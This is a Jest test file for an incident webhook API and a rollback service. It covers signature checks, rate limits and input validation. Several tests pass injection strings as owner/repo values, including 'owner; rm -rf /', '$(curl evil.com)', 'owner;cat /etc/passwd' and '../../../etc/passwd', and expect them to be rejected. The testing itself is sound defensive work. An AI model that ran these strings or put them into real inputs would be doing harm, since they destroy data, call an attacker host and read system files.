/**
 * @jest-environment node
 *
 * Tests for Incident Webhook pipeline security:
 * - HMAC signature verification
 * - Input validation (owner, repo, installationId, payload)
 * - Rate limiting
 * - Payload size limits
 * - Source validation
 * - Severity mapping
 * - Rollback service path validation
 * - Default branch detection (non-hardcoded)
 */

jest.mock("@/lib/prisma", () => ({
  __esModule: true,
  default: {
    rateLimit: {
      count: jest.fn().mockResolvedValue(0),
      create: jest.fn().mockResolvedValue({}),
      deleteMany: jest.fn().mockResolvedValue({ count: 0 }),
    },
    aiQuota: {
      findUnique: jest.fn().mockResolvedValue(null),
      upsert: jest.fn().mockResolvedValue({}),
      update: jest.fn().mockResolvedValue({}),
      updateMany: jest.fn().mockResolvedValue({ count: 1 }),
    },
  },
}));

jest.mock("@/lib/utils/githubWebhook", () => ({
  verifyGitHubWebhookSignature: jest.fn(),
}));

jest.mock("@/lib/services/incident-ingestion", () => ({
  getIncidentIngestionService: jest.fn(),
}));

jest.mock("@/lib/services/deployment-analysis", () => ({
  getDeploymentAnalysisService: jest.fn(),
}));

jest.mock("@/lib/services/incident-correlation", () => ({
  getIncidentCorrelationService: jest.fn(),
}));

jest.mock("@/lib/services/rollback-pr", () => ({
  getRollbackPrService: jest.fn(),
}));

jest.mock("@/lib/services/rateLimitService", () => ({
  getClientIp: jest.fn().mockReturnValue("127.0.0.1"),
}));

jest.mock("@/lib/services/quotaService", () => ({
  QuotaService: {
    checkWebhookRateLimit: jest.fn().mockResolvedValue(true),
  },
}));

import { POST } from "@/app/api/integrations/incidents/webhook/route";
import { verifyGitHubWebhookSignature } from "@/lib/utils/githubWebhook";
import { getIncidentIngestionService } from "@/lib/services/incident-ingestion";
import { getDeploymentAnalysisService } from "@/lib/services/deployment-analysis";
import { getIncidentCorrelationService } from "@/lib/services/incident-correlation";
import { getRollbackPrService } from "@/lib/services/rollback-pr";
import { QuotaService } from "@/lib/services/quotaService";
import { NextRequest } from "next/server";

function createRequest(
  body: any,
  options: {
    method?: string;
    headers?: Record<string, string>;
    query?: Record<string, string>;
  } = {}
): NextRequest {
  const url = new URL("https://example.com/api/integrations/incidents/webhook");
  if (options.query) {
    for (const [k, v] of Object.entries(options.query)) {
      url.searchParams.set(k, v);
    }
  }

  const headers = new Headers(options.headers || {});
  if (!headers.has("content-type")) {
    headers.set("content-type", "application/json");
  }

  return new NextRequest(url.toString(), {
    method: options.method || "POST",
    headers,
    body: typeof body === "string" ? body : JSON.stringify(body),
  });
}

function setupMocks(overrides: {
  verifySignature?: boolean;
  processWebhook?: any;
  deploymentContext?: string;
  correlation?: any;
  rollbackResult?: any;
  rateLimitAllowed?: boolean;
} = {}) {
  const {
    verifySignature = true,
    processWebhook = {
      id: "test-incident-1",
      title: "Test Incident",
      severity: "critical" as const,
      timestamp: new Date().toISOString(),
      environment: "production",
      source: "sentry" as const,
    },
    deploymentContext = "PR #1: Fix bug (Merged by user at 2026-06-01)",
    correlation = {
      likelyPrNumber: 1,
      likelyCommitSha: "abc123",
      impactedFiles: ["src/index.ts"],
      impactedServices: ["api"],
      confidenceScore: 90,
      analysisDetails: "PR #1 likely caused this",
    },
    rollbackResult = {
      success: true,
      prUrl: "https://github.com/test/repo/pull/99",
      prNumber: 99,
      autoMerged: false,
    },
    rateLimitAllowed = true,
  } = overrides;

  (verifyGitHubWebhookSignature as jest.Mock).mockReturnValue(verifySignature);
  (QuotaService.checkWebhookRateLimit as jest.Mock).mockResolvedValue(
    rateLimitAllowed
  );

  const ingestionService = {
    processWebhook: jest.fn().mockReturnValue(processWebhook),
  };
  (getIncidentIngestionService as jest.Mock).mockReturnValue(ingestionService);

  const deploymentService = {
    getRecentDeploymentContext: jest.fn().mockResolvedValue(deploymentContext),
  };
  (getDeploymentAnalysisService as jest.Mock).mockReturnValue(deploymentService);

  const correlationService = {
    correlateIncident: jest.fn().mockResolvedValue(correlation),
  };
  (getIncidentCorrelationService as jest.Mock).mockReturnValue(
    correlationService
  );

  const rollbackService = {
    executeRollback: jest.fn().mockResolvedValue(rollbackResult),
  };
  (getRollbackPrService as jest.Mock).mockReturnValue(rollbackService);

  return {
    ingestionService,
    deploymentService,
    correlationService,
    rollbackService,
  };
}

describe("Incident Webhook Route", () => {
  const originalEnv = process.env;

  beforeEach(() => {
    jest.useFakeTimers();
    jest.spyOn(console, "error").mockImplementation(() => {});
    jest.spyOn(console, "warn").mockImplementation(() => {});
    jest.spyOn(console, "log").mockImplementation(() => {});
    process.env = { ...originalEnv };
    delete process.env.INCIDENT_WEBHOOK_SECRET;
    delete process.env.AUTO_ROLLBACK_ENABLED;
    delete process.env.MIN_ROLLBACK_CONFIDENCE;
  });

  afterEach(() => {
    jest.useRealTimers();
    jest.restoreAllMocks();
    process.env = originalEnv;
  });

  // =========================================================================
  // Rate Limiting
  // =========================================================================

  describe("rate limiting", () => {
    it("returns 429 when rate limit exceeded", async () => {
      setupMocks({ rateLimitAllowed: false });

      const req = createRequest(
        { title: "Test", severity: "critical" },
        { query: { owner: "test", repo: "repo" } }
      );

      const response = await POST(req);
      const body = await response.json();

      expect(response.status).toBe(429);
      expect(body.success).toBe(false);
      expect(body.error).toContain("Too many requests");
    });

    it("proceeds when rate limit allows", async () => {
      setupMocks();

      const req = createRequest(
        { title: "Test", severity: "critical" },
        { query: { owner: "test", repo: "repo" } }
      );

      const response = await POST(req);
      expect(response.status).toBe(200);
    });
  });

  // =========================================================================
  // Payload Validation
  // =========================================================================

  describe("payload validation", () => {
    it("rejects empty payload", async () => {
      setupMocks();

      const req = createRequest("", {
        query: { owner: "test", repo: "repo" },
      });

      const response = await POST(req);
      const body = await response.json();

      expect(response.status).toBe(400);
      expect(body.error).toContain("Empty payload");
    });

    it("rejects invalid JSON", async () => {
      setupMocks();

      const req = createRequest("not-json", {
        query: { owner: "test", repo: "repo" },
      });

      const response = await POST(req);
      const body = await response.json();

      expect(response.status).toBe(400);
      expect(body.error).toContain("Invalid JSON");
    });

    it("rejects non-object payload", async () => {
      setupMocks();

      const req = createRequest("[]", {
        query: { owner: "test", repo: "repo" },
      });

      const response = await POST(req);
      const body = await response.json();

      expect(response.status).toBe(400);
      expect(body.error).toContain("JSON object");
    });

    it("rejects oversized payload", async () => {
      setupMocks();

      const largeBody = "x".repeat(1024 * 1024 + 1);
      const req = createRequest(largeBody, {
        query: { owner: "test", repo: "repo" },
      });

      const response = await POST(req);
      const body = await response.json();

      expect(response.status).toBe(413);
      expect(body.error).toContain("Payload too large");
    });

    it("validates incident timestamp is valid date", async () => {
      setupMocks();

      const req = createRequest(
        { title: "Test", severity: "critical", timestamp: "not-a-date" },
        { query: { owner: "test", repo: "repo" } }
      );

      const response = await POST(req);
      const body = await response.json();

      expect(response.status).toBe(400);
      expect(body.error).toContain("valid date");
    });

    it("rejects timestamp too far in the future", async () => {
      setupMocks();

      const futureDate = new Date(Date.now() + 48 * 60 * 60 * 1000);
      const req = createRequest(
        {
          title: "Test",
          severity: "critical",
          timestamp: futureDate.toISOString(),
        },
        { query: { owner: "test", repo: "repo" } }
      );

      const response = await POST(req);
      const body = await response.json();

      expect(response.status).toBe(400);
      expect(body.error).toContain("too far in the future");
    });

    it("rejects timestamp too far in the past", async () => {
      setupMocks();

      const pastDate = new Date(Date.now() - 8 * 24 * 60 * 60 * 1000);
      const req = createRequest(
        {
          title: "Test",
          severity: "critical",
          timestamp: pastDate.toISOString(),
        },
        { query: { owner: "test", repo: "repo" } }
      );

      const response = await POST(req);
      const body = await response.json();

      expect(response.status).toBe(400);
      expect(body.error).toContain("too far in the past");
    });

    it("validates incident title type", async () => {
      setupMocks();

      const req = createRequest(
        { title: 12345, severity: "critical" },
        { query: { owner: "test", repo: "repo" } }
      );

      const response = await POST(req);
      const body = await response.json();

      expect(response.status).toBe(400);
      expect(body.error).toContain("title must be a string");
    });

    it("validates incident severity type", async () => {
      setupMocks();

      const req = createRequest(
        { title: "Test", severity: 123 },
        { query: { owner: "test", repo: "repo" } }
      );

      const response = await POST(req);
      const body = await response.json();

      expect(response.status).toBe(400);
      expect(body.error).toContain("severity must be a string");
    });
  });

  // =========================================================================
  // Query Parameter Validation
  // =========================================================================

  describe("query parameter validation", () => {
    it("rejects invalid owner characters", async () => {
      setupMocks();

      const req = createRequest(
        { title: "Test", severity: "critical" },
        { query: { owner: "owner; rm -rf /", repo: "repo" } }
      );

      const response = await POST(req);
      const body = await response.json();

      expect(response.status).toBe(400);
      expect(body.error).toContain("invalid characters");
    });

    it("rejects invalid repo characters", async () => {
      setupMocks();

      const req = createRequest(
        { title: "Test", severity: "critical" },
        { query: { owner: "test", repo: "$(evil)" } }
      );

      const response = await POST(req);
      const body = await response.json();

      expect(response.status).toBe(400);
      expect(body.error).toContain("invalid characters");
    });

    it("rejects owner that is too long", async () => {
      setupMocks();

      const req = createRequest(
        { title: "Test", severity: "critical" },
        { query: { owner: "a".repeat(256), repo: "repo" } }
      );

      const response = await POST(req);
      const body = await response.json();

      expect(response.status).toBe(400);
      expect(body.error).toContain("too long");
    });

    it("rejects repo that is too long", async () => {
      setupMocks();

      const req = createRequest(
        { title: "Test", severity: "critical" },
        { query: { owner: "test", repo: "a".repeat(256) } }
      );

      const response = await POST(req);
      const body = await response.json();

      expect(response.status).toBe(400);
      expect(body.error).toContain("too long");
    });

    it("rejects non-numeric installationId", async () => {
      setupMocks();

      const req = createRequest(
        { title: "Test", severity: "critical" },
        {
          query: {
            owner: "test",
            repo: "repo",
            installationId: "abc",
          },
        }
      );

      const response = await POST(req);
      const body = await response.json();

      expect(response.status).toBe(400);
      expect(body.error).toContain("must be a number");
    });

    it("rejects negative installationId", async () => {
      setupMocks();

      const req = createRequest(
        { title: "Test", severity: "critical" },
        {
          query: {
            owner: "test",
            repo: "repo",
            installationId: "-5",
          },
        }
      );

      const response = await POST(req);
      const body = await response.json();

      expect(response.status).toBe(400);
      expect(body.error).toContain("must be positive");
    });

    it("accepts valid owner/repo/installationId", async () => {
      setupMocks();

      const req = createRequest(
        { title: "Test", severity: "critical" },
        {
          query: {
            owner: "my-org",
            repo: "my-repo",
            installationId: "42",
          },
        }
      );

      const response = await POST(req);
      expect(response.status).toBe(200);
    });

    it("accepts owner with dots, hyphens, underscores", async () => {
      setupMocks();

      const req = createRequest(
        { title: "Test", severity: "critical" },
        {
          query: {
            owner: "my-org.v2",
            repo: "repo_name-1",
          },
        }
      );

      const response = await POST(req);
      expect(response.status).toBe(200);
    });
  });

  // =========================================================================
  // Webhook Signature Verification
  // =========================================================================

  describe("webhook signature verification", () => {
    it("skips verification when INCIDENT_WEBHOOK_SECRET not set", async () => {
      delete process.env.INCIDENT_WEBHOOK_SECRET;
      setupMocks();

      const req = createRequest(
        { title: "Test", severity: "critical" },
        { query: { owner: "test", repo: "repo" } }
      );

      const response = await POST(req);
      expect(response.status).toBe(200);
      expect(verifyGitHubWebhookSignature).not.toHaveBeenCalled();
    });

    it("requires signature when INCIDENT_WEBHOOK_SECRET is set", async () => {
      process.env.INCIDENT_WEBHOOK_SECRET = "test-secret";
      setupMocks();

      const req = createRequest(
        { title: "Test", severity: "critical" },
        {
          query: { owner: "test", repo: "repo" },
          headers: {}, // No signature header
        }
      );

      const response = await POST(req);
      const body = await response.json();

      expect(response.status).toBe(401);
      expect(body.error).toContain("Missing webhook signature");
    });

    it("rejects invalid signature", async () => {
      process.env.INCIDENT_WEBHOOK_SECRET = "test-secret";
      setupMocks({ verifySignature: false });

      const req = createRequest(
        { title: "Test", severity: "critical" },
        {
          query: { owner: "test", repo: "repo" },
          headers: {
            "x-hub-signature-256": "sha256=invalidsignature",
          },
        }
      );

      const response = await POST(req);
      const body = await response.json();

      expect(response.status).toBe(401);
      expect(body.error).toContain("Invalid webhook signature");
    });

    it("accepts valid signature via x-hub-signature-256", async () => {
      process.env.INCIDENT_WEBHOOK_SECRET = "test-secret";
      setupMocks({ verifySignature: true });

      const req = createRequest(
        { title: "Test", severity: "critical" },
        {
          query: { owner: "test", repo: "repo" },
          headers: {
            "x-hub-signature-256": "sha256=validsignature",
          },
        }
      );

      const response = await POST(req);
      expect(response.status).toBe(200);
      expect(verifyGitHubWebhookSignature).toHaveBeenCalledWith(
        expect.objectContaining({
          webhookSecret: "test-secret",
        })
      );
    });

    it("accepts valid signature via x-webhook-signature", async () => {
      process.env.INCIDENT_WEBHOOK_SECRET = "test-secret";
      setupMocks({ verifySignature: true });

      const req = createRequest(
        { title: "Test", severity: "critical" },
        {
          query: { owner: "test", repo: "repo" },
          headers: {
            "x-webhook-signature": "sha256=validsignature",
          },
        }
      );

      const response = await POST(req);
      expect(response.status).toBe(200);
    });
  });

  // =========================================================================
  // Source Validation
  // =========================================================================

  describe("source validation", () => {
    it("accepts valid source header", async () => {
      const mocks = setupMocks();

      const req = createRequest(
        { title: "Test", severity: "critical" },
        {
          query: { owner: "test", repo: "repo" },
          headers: { "x-incident-source": "sentry" },
        }
      );

      await POST(req);
      expect(mocks.ingestionService.processWebhook).toHaveBeenCalledWith(
        "sentry",
        expect.any(Object)
      );
    });

    it("defaults to generic for unknown source", async () => {
      const mocks = setupMocks();

      const req = createRequest(
        { title: "Test", severity: "critical" },
        {
          query: { owner: "test", repo: "repo" },
          headers: { "x-incident-source": "unknown-source" },
        }
      );

      await POST(req);
      expect(mocks.ingestionService.processWebhook).toHaveBeenCalledWith(
        "generic",
        expect.any(Object)
      );
    });

    it("defaults to generic when no source header", async () => {
      const mocks = setupMocks();

      const req = createRequest(
        { title: "Test", severity: "critical" },
        { query: { owner: "test", repo: "repo" } }
      );

      await POST(req);
      expect(mocks.ingestionService.processWebhook).toHaveBeenCalledWith(
        "generic",
        expect.any(Object)
      );
    });
  });

  // =========================================================================
  // Pipeline Integration
  // =========================================================================

  describe("pipeline integration", () => {
    it("calls ingestion with source and payload", async () => {
      const mocks = setupMocks();
      const payload = { title: "Test Incident", severity: "critical" };

      const req = createRequest(payload, {
        query: { owner: "test", repo: "repo" },
      });

      await POST(req);
      expect(mocks.ingestionService.processWebhook).toHaveBeenCalledWith(
        "generic",
        payload
      );
    });

    it("passes validated owner/repo to deployment service", async () => {
      const mocks = setupMocks();

      const req = createRequest(
        { title: "Test", severity: "critical" },
        {
          query: {
            owner: "my-org",
            repo: "my-repo",
            installationId: "42",
          },
        }
      );

      await POST(req);
      expect(
        mocks.deploymentService.getRecentDeploymentContext
      ).toHaveBeenCalledWith(42, "my-org", "my-repo", expect.any(String));
    });

    it("triggers rollback when correlation has likely PR", async () => {
      const mocks = setupMocks();

      const req = createRequest(
        { title: "Test", severity: "critical" },
        { query: { owner: "test", repo: "repo" } }
      );

      await POST(req);
      expect(mocks.rollbackService.executeRollback).toHaveBeenCalled();
    });

    it("skips rollback when no likely PR", async () => {
      const mocks = setupMocks({
        correlation: {
          likelyPrNumber: undefined,
          confidenceScore: 0,
          impactedFiles: [],
          impactedServices: [],
          analysisDetails: "No correlation found",
        },
      });

      const req = createRequest(
        { title: "Test", severity: "critical" },
        { query: { owner: "test", repo: "repo" } }
      );

      await POST(req);
      expect(mocks.rollbackService.executeRollback).not.toHaveBeenCalled();
    });

    it("returns 500 on internal errors without leaking details", async () => {
      setupMocks();

      (getIncidentIngestionService as jest.Mock).mockImplementation(() => {
        throw new Error("Internal failure with sensitive data: password=secret123");
      });

      const req = createRequest(
        { title: "Test", severity: "critical" },
        { query: { owner: "test", repo: "repo" } }
      );

      const response = await POST(req);
      const body = await response.json();

      expect(response.status).toBe(500);
      expect(body.error).toBe("Internal server error");
      // Ensure no sensitive data leaks
      expect(body.error).not.toContain("password");
    });
  });

  // =========================================================================
  // Response Format
  // =========================================================================

  describe("response format", () => {
    it("returns success with report on valid request", async () => {
      setupMocks();

      const req = createRequest(
        { title: "Test", severity: "critical" },
        { query: { owner: "test", repo: "repo" } }
      );

      const response = await POST(req);
      const body = await response.json();

      expect(response.status).toBe(200);
      expect(body.success).toBe(true);
      expect(body.report).toBeDefined();
      expect(body.report.incidentId).toBeDefined();
      expect(body.report.severity).toBe("critical");
    });

    it("includes rollback result when available", async () => {
      setupMocks({
        rollbackResult: {
          success: true,
          prUrl: "https://github.com/test/repo/pull/99",
          prNumber: 99,
          autoMerged: true,
        },
      });

      const req = createRequest(
        { title: "Test", severity: "critical" },
        { query: { owner: "test", repo: "repo" } }
      );

      const response = await POST(req);
      const body = await response.json();

      expect(body.report.rollbackPrepared).toBe(true);
      expect(body.report.emergencyPrUrl).toBe(
        "https://github.com/test/repo/pull/99"
      );
      expect(body.report.autoMerged).toBe(true);
    });
  });
});

// =========================================================================
// RollbackPrService Tests
// =========================================================================

describe("RollbackPrService", () => {
  beforeEach(() => {
    jest.resetModules();
  });

  function getRollbackService() {
    const mod = jest.requireActual("../rollback-pr");
    return new mod.RollbackPrService();
  }

  it("validates owner format", async () => {
    const service = getRollbackService();

    const result = await (service as any).validateGitHubPath(
      "invalid owner!",
      "repo"
    );
    expect(result).toContain("Invalid owner format");
  });

  it("validates repo format", async () => {
    const service = getRollbackService();

    const result = await (service as any).validateGitHubPath(
      "owner",
      "repo with spaces"
    );
    expect(result).toContain("Invalid repo format");
  });

  it("rejects overly long owner", async () => {
    const service = getRollbackService();

    const result = await (service as any).validateGitHubPath(
      "a".repeat(101),
      "repo"
    );
    expect(result).toContain("too long");
  });

  it("returns null for valid owner/repo", async () => {
    const service = getRollbackService();

    const result = await (service as any).validateGitHubPath(
      "my-org",
      "my-repo"
    );
    expect(result).toBeNull();
  });

  it("rejects empty owner", async () => {
    const service = getRollbackService();

    const result = await (service as any).validateGitHubPath("", "repo");
    expect(result).toContain("Invalid owner format");
  });

  it("rejects owner with shell metacharacters", async () => {
    const service = getRollbackService();

    const result = await (service as any).validateGitHubPath(
      "$(curl evil.com)",
      "repo"
    );
    expect(result).toContain("Invalid owner format");
  });

  it("rejects repo with path traversal", async () => {
    const service = getRollbackService();

    const result = await (service as any).validateGitHubPath(
      "owner",
      "../../../etc/passwd"
    );
    expect(result).toContain("Invalid repo format");
  });

  it("rejects owner with semicolons", async () => {
    const service = getRollbackService();

    const result = await (service as any).validateGitHubPath(
      "owner;cat /etc/passwd",
      "repo"
    );
    expect(result).toContain("Invalid owner format");
  });

  it("rejects repo with pipe characters", async () => {
    const service = getRollbackService();

    const result = await (service as any).validateGitHubPath(
      "owner",
      "repo|cat secret"
    );
    expect(result).toContain("Invalid repo format");
  });

  it("accepts owner with dots and hyphens", async () => {
    const service = getRollbackService();

    const result = await (service as any).validateGitHubPath(
      "my-org.v2",
      "repo-name_1"
    );
    expect(result).toBeNull();
  });

  it("rejects owner with spaces", async () => {
    const service = getRollbackService();

    const result = await (service as any).validateGitHubPath(
      "my org",
      "repo"
    );
    expect(result).toContain("Invalid owner format");
  });

  it("rejects repo with null bytes", async () => {
    const service = getRollbackService();

    const result = await (service as any).validateGitHubPath(
      "owner",
      "repo\x00secret"
    );
    expect(result).toContain("Invalid repo format");
  });
});
